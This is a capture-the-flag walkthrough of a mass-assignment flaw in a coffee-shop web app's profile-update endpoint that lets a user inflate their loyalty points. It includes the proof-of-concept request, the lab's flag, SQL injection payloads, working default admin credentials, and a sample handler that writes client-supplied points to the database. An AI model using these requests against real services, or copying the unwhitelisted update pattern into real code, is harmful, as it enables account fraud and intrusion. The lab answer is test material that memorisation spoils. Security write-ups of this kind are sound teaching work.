# cafeclub-007 - BugForge Lab Walkthrough

**URL:** https://lab-1785077753505-p9ldbn.labs-app.bugforge.io
**Difficulty:** Easy
**Vulnerability:** Mass Assignment on `PUT /api/profile`
**Flag:** `bug{DB4GNzeGvgK6dCZMSMP9X3N1X0DJzz3h}`

---

## Summary

CafeClub is a coffee-shop e-commerce SPA with products, a cart, checkout, gift cards, and a
loyalty points system. The profile-update endpoint accepts and persists any field sent in the
request body, including the `points` loyalty balance, which should only ever be adjusted by the
server as a side effect of orders or redemptions. Sending an arbitrary `points` value in a normal
profile update inflates the balance directly, and the server confirms the write by returning the
flag in the success response.

---

## Tech Stack

- React SPA frontend (Create React App)
- Express.js (Node.js) backend
- JWT bearer auth issued at registration (no separate login step required to get a usable token)
- SQLite

---

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|----------|--------|------|-------|
| `/api/register` | POST | No | Returns a usable JWT directly, `points` starts at 0 |
| `/api/profile` | GET | JWT | Returns the caller's own profile row |
| `/api/profile` | PUT | JWT | Vulnerable - no field whitelist, accepts `points` |
| `/api/profile/password` | PUT | JWT | Separate endpoint, not needed for this bug |
| `/api/products/:id` | GET | JWT | Path parameter shows a SQL-injection signal but was not needed for the flag |

---

## Discovery

Registration on this app returns a usable JWT immediately, so the first step was just getting an
authenticated session:

```
POST /api/register {"username":"cafehunter1","email":"cafehunter1@test.com","password":"Passw0rd123!"}
-> {"token":"...", "user":{"id":6,"points":0,"role":"user"}}
```

With a token in hand, the standard approach for any account-editing feature is to test every write
endpoint for missing server-side field restrictions, not just the fields the UI actually exposes.
`PUT /api/profile` is the natural first target since it is the one endpoint that lets a user
modify their own stored data.

A quick login attempt with `admin:admin123` succeeded, confirming default credentials were left in
place, but an admin session on its own did not expose a flag anywhere and was not pursued further
(admin access is rarely the intended path on these labs).

Back on the low-privilege account, a few authorization-bypass classics were ruled out quickly:

- SQL injection payloads (`' OR 1=1--` and variants) against `/api/login` all returned a clean
  `400`, no auth bypass.
- Adding `"role":"admin"` to the profile-update body was accepted with a `200` but silently had no
  effect; a follow-up `GET /api/profile` still showed `"role":"user"`. That field is whitelisted
  server-side.

The interesting part of the account is the loyalty `points` balance shown in the profile object.
Since `role` was blocked but present in the same object, the natural next test was whether *other*
non-editable fields in that same object were filtered the same way, or whether the whitelist (if
any) was incomplete.

## Proof of Concept

```
PUT /api/profile
Authorization: Bearer <own JWT>
Content-Type: application/json

{
  "full_name": "Cafe Hunter",
  "email": "cafehunter1@test.com",
  "address": "1 Main St",
  "phone": "5555555555",
  "points": 999999,
  "role": "admin"
}
```

Response:

```json
{"message": "Profile updated successfully bug{DB4GNzeGvgK6dCZMSMP9X3N1X0DJzz3h}"}
```

Confirming the write actually persisted (not just accepted and discarded, as `role` was):

```
GET /api/profile
Authorization: Bearer <own JWT>

-> {"user":{..., "points": 999999, "role": "user"}}
```

`points` landed at the attacker-supplied value while `role` stayed `user`, showing the field
filtering on this endpoint is inconsistent: some sensitive fields are protected, others are not.

---

## Dead Ends

| Tried | Result | Lesson |
|---|---|---|
| SQLi auth bypass on `/api/login` (`' OR 1=1--` and variants) | Clean `400` on every payload | Login query is parameterized |
| Mass assignment `role:admin` on profile update | Accepted with `200` but silently ignored | `role` is explicitly whitelisted server-side |
| Default credentials `admin:admin123` | Login succeeded | Valid but a dead end for the flag; admin session exposed nothing extra |
| UNION SQLi signal on `GET /api/products/:id` | Confirmed injectable (single-column UNION) | Real bug but unrelated to this flag, not pursued further |

---

## Root Cause

The profile-update handler writes the entire request body (or an incomplete field list) onto the
user record instead of whitelisting only the fields a user should be able to edit themselves
(name, email, address, phone):

```javascript
// Vulnerable pattern (approximate)
app.put("/api/profile", authenticate, async (req, res) => {
  const { full_name, email, address, phone, points } = req.body;
  await db.run(
    "UPDATE users SET full_name = ?, email = ?, address = ?, phone = ?, points = ? WHERE id = ?",
    [full_name, email, address, phone, points, req.user.id]
  );
  res.json({ message: "Profile updated successfully" });
});
```

`points` is a server-authoritative balance that should only change as a result of completed
orders or gift-card redemptions, but it is treated identically to ordinary profile metadata and
accepted straight from client input with no server-side recomputation or bounds check.

---

## CWE / OWASP

- **CWE-915**: Improperly Controlled Modification of Dynamically-Determined Object Attributes (Mass Assignment)
- **OWASP A04:2021** - Insecure Design / Business Logic
- **OWASP A01:2021** - Broken Access Control (client controlling server-authoritative state)
